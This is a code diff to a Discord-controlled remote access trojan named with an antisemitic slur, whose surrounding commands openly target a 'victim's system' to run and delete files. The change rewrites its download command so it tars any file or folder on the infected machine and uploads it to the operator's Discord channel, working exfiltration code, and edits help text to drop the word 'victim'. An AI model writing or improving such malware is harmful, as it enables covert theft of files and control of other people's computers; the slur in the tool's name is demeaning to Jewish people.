@@ -21,6 +21,7 @@ import datetime
 import platform
 import pymsgbox
 import requests
+import tempfile
 import win32con
 import win32gui
 import asyncio
@@ -54,7 +55,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.11.3" # Replace with current JewFuss version, shows in some commands. Compiler looks for this comment for updates, so DO NOT MODIFY THIS COMMENT! - 25c75g
+version = "1.0.12.0" # Replace with current JewFuss version, shows in some commands. Compiler looks for this comment for updates, so DO NOT MODIFY THIS COMMENT! - 25c75g
 USE_TRAY_ICON = False # Enables Tray icon (right click to see version and exit button). DO NOT MODIFY THIS COMMENT! (easy compiler looks for this) | Default: False - 28f93g
 
 starttime = time.perf_counter()
@@ -2578,36 +2579,85 @@ async def run(ctx, file_path: str = None):
     except Exception as e:
         await ctx.send(f"Error: Could not execute the file. {str(e)}")    
 
-@bot.command(help="Compresses and downloads a file or folder from victim's system", usage="$download <file/folder>")
+@bot.command(help="Downloads a file or compressed folder from the system", usage="$download <file/folder>")
 async def download(ctx, file_path: str = None):
+    if not file_path:
+        await ctx.send("Error: No file path provided.")
+        return
+
+    file_path = os.path.abspath(os.path.expanduser(file_path))
+
+    if not os.path.exists(file_path):
+        await ctx.send(f"Error: The path '{file_path}' does not exist.")
+        return
+
+    upload_limit = ctx.guild.filesize_limit if ctx.guild else 10 * 1024 * 1024
+    ram_limit = 64 * 1024 * 1024
+
     try:
-        if not file_path:
-            await ctx.send("Error: No file path provided. Please specify the file or folder path to download.")
+        if os.path.isfile(file_path) and os.path.getsize(file_path) <= upload_limit:
+            await ctx.send(
+                file=discord.File(
+                    file_path,
+                    filename=os.path.basename(file_path)
+                )
+            )
             return
 
-        if not os.path.exists(file_path):
-            await ctx.send(f"Error: The path '{file_path}' does not exist.")
-            return
+        clean_path = os.path.normpath(file_path)
+        archive_name = os.path.basename(clean_path) + ".tar.gz"
 
-        async def compress_async():
+        with tempfile.SpooledTemporaryFile(
+            max_size=ram_limit,
+            mode="w+b"
+        ) as archive:
+
             def compress():
-                clean_path = file_path.rstrip("\\/")
-                tar_filename = os.path.basename(clean_path) + ".tar.gz"
-                buffer = io.BytesIO()
+                with tarfile.open(
+                    fileobj=archive,
+                    mode="w:gz",
+                    format=tarfile.PAX_FORMAT
+                ) as tar:
+                    tar.add(
+                        clean_path,
+                        arcname=os.path.basename(clean_path),
+                        recursive=True
+                    )
 
-                with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
-                    tar.add(clean_path, arcname=os.path.basename(clean_path))
+                archive.seek(0, os.SEEK_END)
+                size = archive.tell()
+                archive.seek(0)
 
-                buffer.seek(0)
-                return buffer, tar_filename
+                return size
 
-            return await asyncio.to_thread(compress)
+            archive_size = await asyncio.to_thread(compress)
 
-        buffer, tar_filename = await compress_async()
-        await ctx.send(file=discord.File(fp=buffer, filename=tar_filename))
+            if archive_size > upload_limit:
+                await ctx.send(
+                    f"Error: The compressed archive is "
+                    f"{archive_size / 1024 / 1024:.2f} MB, which exceeds "
+                    f"Discord's {upload_limit / 1024 / 1024:.2f} MB upload limit."
+                )
+                return
+
+            await ctx.send(
+                file=discord.File(
+                    archive,
+                    filename=archive_name
+                )
+            )
+
+    except PermissionError as e:
+        await ctx.send(f"Error: Permission denied while accessing the file or folder. {e}")
+
+    except discord.Forbidden:
+        await ctx.send("Error: I don't have permission to upload files in this channel.")
+
+    except discord.HTTPException as e:
+        await ctx.send(f"Error: Discord rejected the upload. {e}")
 
     except Exception as e:
-        await ctx.send(f"Error: Could not compress and send the file or folder. {e}")
+        await ctx.send(f"Error: Could not send the file or folder. {e}")
     
 @bot.command(help="Deletes a folder or file from the victim's system", usage="$delete <file>")
 async def delete(ctx, path: str = None):
